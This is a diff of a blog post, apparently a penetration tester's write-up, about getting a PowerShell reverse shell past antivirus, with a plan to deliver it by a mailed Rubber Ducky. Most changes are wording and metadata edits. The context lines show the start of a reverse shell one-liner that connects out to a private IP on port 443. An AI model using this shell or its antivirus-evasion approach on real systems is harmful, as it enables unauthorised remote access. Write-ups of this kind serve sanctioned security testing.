@@ -17,7 +17,7 @@
 <meta name="twitter:card" content="summary" />
 <meta property="twitter:title" content="Thinking Simpler to Bypass Antivirus" />
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"Thinking Simpler to Bypass Antivirus","dateModified":"2021-04-26T00:00:00-04:00","datePublished":"2021-04-26T00:00:00-04:00","url":"https://hackerob.github.io/articles/thinking_simpler_to_bypass_antivirus.html","mainEntityOfPage":{"@type":"WebPage","@id":"https://hackerob.github.io/articles/thinking_simpler_to_bypass_antivirus.html"},"description":"On a previous engagement I sat in front of my computer banging my head, trying to come up with a simple reverse shell that I could be confident would get past my clients antivirus. My plan was to send a Rubber Ducky in the mail that when plugged into my victims computer would emulate a keyboard and inject a series of keystrokes that would give me remote access to the computer. But I was stuck struggling trying to figure out a way to get past antivirus.","@context":"https://schema.org"}</script>
+{"headline":"Thinking Simpler to Bypass Antivirus","dateModified":"2021-04-26T00:00:00-04:00","datePublished":"2021-04-26T00:00:00-04:00","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://hackerob.github.io/articles/thinking_simpler_to_bypass_antivirus.html"},"url":"https://hackerob.github.io/articles/thinking_simpler_to_bypass_antivirus.html","description":"On a previous engagement I sat in front of my computer banging my head, trying to come up with a simple reverse shell that I could be confident would get past my clients antivirus. My plan was to send a Rubber Ducky in the mail that when plugged into my victims computer would emulate a keyboard and inject a series of keystrokes that would give me remote access to the computer. But I was stuck struggling trying to figure out a way to get past antivirus.","@context":"https://schema.org"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="stylesheet" href="/assets/main.css">
   <link rel="shortcut icon" type="image/png" href="/favicon.png"><link type="application/atom+xml" rel="alternate" href="https://hackerob.github.io/feed.xml" title="hackerob" /></head>
@@ -54,7 +54,7 @@
 
 <p>After days of struggling trying to customize the code more it was time to give up and go back to square one. Maybe it was true, antivirus had become too smart, after all it was using AI and Machine Learning. Don’t worry I know that’s not true, but I had become disheartened. I had to remember that antivirus only blocks known malicious code, whether that be a malicious type of command or just a word in the code tagged as bad. Based on that knowledge my new idea was to create a reverse shell in PowerShell trying to write completely custom code.</p>
 
-<p>I created a simple reverse shell and then soon realized that it was almost identical to well known PowerShell reverse shell one liner. I can’t actually find the reverse shell I made several months ago but below is essentially the PowerShell Reverse Shell one liner from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#PowerShell">PayloadsAllTheThings</a> with some of my own tweaks mixed in.</p>
+<p>I created a simple reverse shell and then soon realized that it was almost identical to the well known PowerShell reverse shell one liner. I can’t actually find the reverse shell I made several months ago but below is essentially the PowerShell Reverse Shell one liner from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#PowerShell">PayloadsAllTheThings</a> with some of my own tweaks mixed in.</p>
 
 <figure class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span class="nv">$client</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nx">System.Net.Sockets.TCPClient</span><span class="p">(</span><span class="s2">"192.168.233.129"</span><span class="p">,</span><span class="mi">443</span><span class="p">)</span><span class="w">
 </span><span class="nv">$stream</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nv">$client</span><span class="o">.</span><span class="nf">GetStream</span><span class="p">()</span><span class="w">
@@ -83,7 +83,7 @@
 
 <p><img src="/assets/img/AV_Script_Bypass.PNG" alt="Reverse Shell Script Failure" class="center-image" /></p>
 
-<p>Yes, we can. It is really that simple.</p>
+<p>Yes, we can. It really is that simple.</p>
 
 <p>What is going on?</p>
 
